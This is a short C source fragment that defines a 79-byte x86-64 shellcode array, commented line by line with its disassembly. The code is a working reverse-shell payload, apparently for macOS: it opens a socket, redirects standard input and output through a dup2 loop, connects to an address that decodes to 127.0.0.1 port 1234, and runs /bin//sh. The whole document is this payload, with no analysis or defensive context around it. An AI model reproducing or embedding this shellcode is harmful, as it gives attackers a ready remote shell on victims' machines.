
// Target architecture : X86 64

#define RS_SIZE 79

char RS[] = {
  /* 0000 */ "\x48\xb9\xff\xfd\xfb\x2d\x80\xff\xff\xfe" /* movabs  rcx, -0x100007fd2040201 */
  /* 000A */ "\x48\xf7\xd1"                             /* not     rcx                     */
  /* 000D */ "\x51"                                     /* push    rcx                     */
  /* 000E */ "\x31\xed"                                 /* xor     ebp, ebp                */
  /* 0010 */ "\x0f\xba\xed\x19"                         /* bts     ebp, 0x19               */
  /* 0014 */ "\x55"                                     /* push    rbp                     */
  /* 0015 */ "\x58"                                     /* pop     rax                     */
  /* 0016 */ "\x99"                                     /* cdq                             */
  /* 0017 */ "\x6a\x01"                                 /* push    1                       */
  /* 0019 */ "\x5e"                                     /* pop     rsi                     */
  /* 001A */ "\x6a\x02"                                 /* push    2                       */
  /* 001C */ "\x5f"                                     /* pop     rdi                     */
  /* 001D */ "\xb0\x61"                                 /* mov     al, 0x61                */
  /* 001F */ "\x0f\x05"                                 /* syscall                         */
  /* 0021 */ "\x97"                                     /* xchg    eax, edi                */
  /* 0022 */ "\x96"                                     /* xchg    eax, esi                */
  /* 0023 */ "\x55"                                     /* push    rbp                     */
  /* 0024 */ "\x58"                                     /* pop     rax                     */
  /* 0025 */ "\xb0\x5a"                                 /* mov     al, 0x5a                */
  /* 0027 */ "\x0f\x05"                                 /* syscall                         */
  /* 0029 */ "\x83\xee\x01"                             /* sub     esi, 1                  */
  /* 002C */ "\x79\xf5"                                 /* jns     0x23                    */
  /* 002E */ "\x55"                                     /* push    rbp                     */
  /* 002F */ "\x58"                                     /* pop     rax                     */
  /* 0030 */ "\x54"                                     /* push    rsp                     */
  /* 0031 */ "\x5e"                                     /* pop     rsi                     */
  /* 0032 */ "\xb2\x10"                                 /* mov     dl, 0x10                */
  /* 0034 */ "\xb0\x62"                                 /* mov     al, 0x62                */
  /* 0036 */ "\x0f\x05"                                 /* syscall                         */
  /* 0038 */ "\x50"                                     /* push    rax                     */
  /* 0039 */ "\x5e"                                     /* pop     rsi                     */
  /* 003A */ "\x55"                                     /* push    rbp                     */
  /* 003B */ "\x58"                                     /* pop     rax                     */
  /* 003C */ "\x99"                                     /* cdq                             */
  /* 003D */ "\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68" /* movabs  rbx, 0x68732f2f6e69622f */
  /* 0047 */ "\x52"                                     /* push    rdx                     */
  /* 0048 */ "\x53"                                     /* push    rbx                     */
  /* 0049 */ "\x54"                                     /* push    rsp                     */
  /* 004A */ "\x5f"                                     /* pop     rdi                     */
  /* 004B */ "\xb0\x3b"                                 /* mov     al, 0x3b                */
  /* 004D */ "\x0f\x05"                                 /* syscall                         */
};